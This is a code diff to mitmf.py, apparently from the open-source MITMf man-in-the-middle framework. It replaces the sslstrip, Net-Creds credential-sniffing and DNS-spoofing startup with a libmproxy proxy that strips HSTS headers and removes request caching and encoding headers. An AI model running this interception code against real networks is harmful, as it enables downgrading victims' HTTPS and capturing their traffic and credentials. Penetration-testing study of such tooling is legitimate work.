@@ -22,181 +22,84 @@ import argparse
 import sys
 import os
 import logging
-import threading
+import traceback
 
-from twisted.web import http
-from twisted.internet import reactor
-from core.sslstrip.CookieCleaner import CookieCleaner
-from core.sergioproxy.ProxyPlugins import ProxyPlugins
-from core.utils import Banners, SystemConfig, shutdown
+from libmproxy import controller, proxy
+from libmproxy.protocol.http import decoded
+from libmproxy.proxy.server import ProxyServer
+from core.utils import Banners, SystemConfig
+
 from plugins import *
+from modules import *
 
 Banners().printBanner()
 
 if os.geteuid() != 0:
     sys.exit("[-] When man-in-the-middle you want, run as r00t you will, hmm?")
 
-mitmf_version = "0.9.7"
-sslstrip_version = "0.9"
-sergio_version = "0.2.1"
-
-parser = argparse.ArgumentParser(description="MITMf v{} - Framework for MITM attacks".format(mitmf_version), version=mitmf_version, usage='mitmf.py -i interface [mitmf options] [plugin name] [plugin options]', epilog="Use wisely, young Padawan.",fromfile_prefix_chars='@')
-
-#add MITMf options
+parser = argparse.ArgumentParser(description="MITMf v0.9.8 - Framework for MITM attacks", version='0.9.8', usage='mitmf.py -i interface [mitmf options] [plugin name] [plugin options]', epilog="Use wisely, young Padawan.")
 mgroup = parser.add_argument_group("MITMf", "Options for MITMf")
-mgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level [default: info]")
-mgroup.add_argument("-i", "--interface", required=True, type=str,  metavar="interface" ,help="Interface to listen on")
-mgroup.add_argument("-c", "--config-file", dest='configfile', type=str, default="./config/mitmf.conf", metavar='configfile', help="Specify config file to use")
-mgroup.add_argument('-m', '--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')
+mgroup.add_argument('-p', '--port',dest='port', metavar='PORT', default=10000, help="Proxy service port")
+mgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level")
+mgroup.add_argument("--conf", dest='configfile', type=str, default="./config/mitmf.conf", metavar='CONFIG_FILE', help="Specify config file to use")
+mgroup.add_argument('--ssl', dest='ssl', action='store_true', default=[r".*:443"], help='Enable SSL/TLS interception')
 
-#add sslstrip options
-sgroup = parser.add_argument_group("SSLstrip", "Options for SSLstrip library")
-slogopts = sgroup.add_mutually_exclusive_group()
-slogopts.add_argument("-p", "--post", action="store_true",help="Log only SSL POSTs. (default)")
-slogopts.add_argument("-s", "--ssl", action="store_true", help="Log all SSL traffic to and from server.")
-slogopts.add_argument("-a", "--all", action="store_true", help="Log all SSL and HTTP traffic to and from server.")
-sgroup.add_argument("-l", "--listen", type=int, metavar="port", default=10000, help="Port to listen on (default 10000)")
-sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
-sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")
-
-#Initialize plugins
-plugin_classes = plugin.Plugin.__subclasses__()
-
-plugins = []
 try:
-    for p in plugin_classes:
-        plugins.append(p())
-    
-    ProxyPlugins.getInstance().plist_all = plugins
-except Exception as e:
-    print "[-] Failed to load plugin class {}: {}".format(p, e)
-
-
-arg_dict = dict() #dict containing a plugin's optname with it's relative options
-
-#Give subgroup to each plugin with options
-try:
-    for p in plugins:
-        if p.desc == "":
-            sgroup = parser.add_argument_group(p.name,"Options for {}.".format(p.name))
-        else:
-            sgroup = parser.add_argument_group(p.name, p.desc)
-
-        sgroup.add_argument("--{}".format(p.optname), action="store_true",help="Load plugin {}".format(p.name))
-
-        if p.has_opts:
-            p.pluginOptions(sgroup)
-
-        arg_dict[p.optname] = vars(sgroup)['_group_actions']
-
-except NotImplementedError:
-    sys.exit("[-] {} plugin claimed option support, but didn't have it.".format(p.name))
-
-if len(sys.argv) is 1:
+    options = parser.parse_args()
+except:
     parser.print_help()
     sys.exit(1)
 
-args = parser.parse_args()
+if options.ssl:
+    options.ssl = []
 
-# Definitely a better way to do this, will need to clean this up in the future
-# Checks to see if we called a plugin's options without first invoking the actual plugin
-for plugin, options in arg_dict.iteritems():
-    if vars(args)[plugin] is False:
-        for option in options:
-            if vars(args)[option.dest]:
-                sys.exit("[-] Called plugin options without invoking the actual plugin (--{})".format(plugin))
+log_level = logging.__dict__[options.log_level.upper()]
 
-#check to see if we supplied a valid interface
-myip  = SystemConfig.getIP(args.interface)
-mymac = SystemConfig.getMAC(args.interface)
-
-#Start logging
-log_level = logging.__dict__[args.log_level.upper()]
-
-logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
 logFormatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
-mitmf_logger = logging.getLogger('mitmf')
+logger = logging.getLogger('mitmf')
 fileHandler = logging.FileHandler("./logs/mitmf.log")
 fileHandler.setFormatter(logFormatter)
-mitmf_logger.addHandler(fileHandler)
+streamHandler = logging.StreamHandler(sys.stdout)
+streamHandler.setFormatter(logFormatter)
+logger.addHandler(streamHandler)
+logger.addHandler(fileHandler)
+logger.setLevel(log_level)
 
-#####################################################################################################
+class StickyMaster(controller.Master):
+    def __init__(self, server):
+        controller.Master.__init__(self, server)
 
-#All our options should be loaded now, initialize the plugins
-print "[*] MITMf v{} online... initializing plugins".format(mitmf_version)
+    def run(self):
+        try:
+            return controller.Master.run(self)
+        except KeyboardInterrupt:
+            self.shutdown()
+        except Exception as e:
+            traceback.print_exc()
+            self.shutdown()
 
-for p in plugins:
+    #def handle_clientconnect(self, context, handler):
+    #    pass 
 
-    #load only the plugins that have been called at the command line
-    if vars(args)[p.optname] is True:
+    def handle_request(self, flow):
+        del flow.request.headers['accept-encoding']
 
-        print "|_ {} v{}".format(p.name, p.version)
-        if p.tree_info:
-            for line in xrange(0, len(p.tree_info)):
-                print "|  |_ {}".format(p.tree_info.pop())
+        del flow.request.headers['if-modified-since']
+ 
+        del flow.request.headers['cache-control']
 
-        p.initialize(args)
+        logger.info("{} {}".format(flow.client_conn.address.host, flow.request.host))
+        flow.reply()
 
-        if p.tree_info:
-            for line in xrange(0, len(p.tree_info)):
-                print "|  |_ {}".format(p.tree_info.pop())
+    #def handle_serverconnect(self, context, handler):
+    #    pass
 
-        ProxyPlugins.getInstance().addPlugin(p)
+    def handle_response(self, flow):
+        del flow.response.headers["Strict-Transport-Security"]
 
-#Plugins are ready to go, let's rock & roll
-from core.sslstrip.StrippingProxy import StrippingProxy
-from core.sslstrip.URLMonitor import URLMonitor
+        flow.reply()
 
-URLMonitor.getInstance().setFaviconSpoofing(args.favicon)
-CookieCleaner.getInstance().setEnabled(args.killsessions)
-
-strippingFactory          = http.HTTPFactory(timeout=10)
-strippingFactory.protocol = StrippingProxy
-
-reactor.listenTCP(args.listen, strippingFactory)
-
-for p in ProxyPlugins.getInstance().plist:
-
-    p.pluginReactor(strippingFactory) #we pass the default strippingFactory, so the plugins can use it
-    p.startConfigWatch()
-
-    if hasattr(p, 'startThread'):
-        t = threading.Thread(name='{}-Thread'.format(p.name), target=p.startThread)
-        t.setDaemon(True)
-        t.start()
-
-print "|"
-print "|_ Sergio-Proxy v{} online".format(sergio_version)
-print "|_ SSLstrip v{} by Moxie Marlinspike online".format(sslstrip_version)
-
-#Start Net-Creds
-from core.netcreds.NetCreds import NetCreds
-NetCreds().start(args.interface, myip)
-print "|_ Net-Creds v{} online".format(NetCreds.version)
-
-#Start DNSChef
-from core.servers.dns.DNSchef import DNSChef
-DNSChef.getInstance().start()
-print "|_ DNSChef v{} online".format(DNSChef.version)
-
-#Start the HTTP Server
-from core.servers.http.HTTPserver import HTTPserver
-HTTPserver.getInstance().start()
-print "|_ HTTP server online"
-
-#Start the SMB server
-from core.servers.smb.SMBserver import SMBserver
-print "|_ SMB server online [Mode: {}] (Impacket {})".format(SMBserver.getInstance().server_type, SMBserver.getInstance().impacket_ver)
-SMBserver.getInstance().start()
-
-#Start MITMf-API
-from core.mitmfapi import mitmfapi
-mitmfapi().start()
-print "|"
-print "|_ MITMf-API running on http://{}:{}\n".format(mitmfapi.getInstance().host, mitmfapi.getInstance().port)
-
-#start the reactor
-reactor.run()
-
-print "\n"
-shutdown()
+config = proxy.ProxyConfig(ignore_hosts=options.ssl, port=options.port)
+server = ProxyServer(config)
+m = StickyMaster(server)
+m.run()
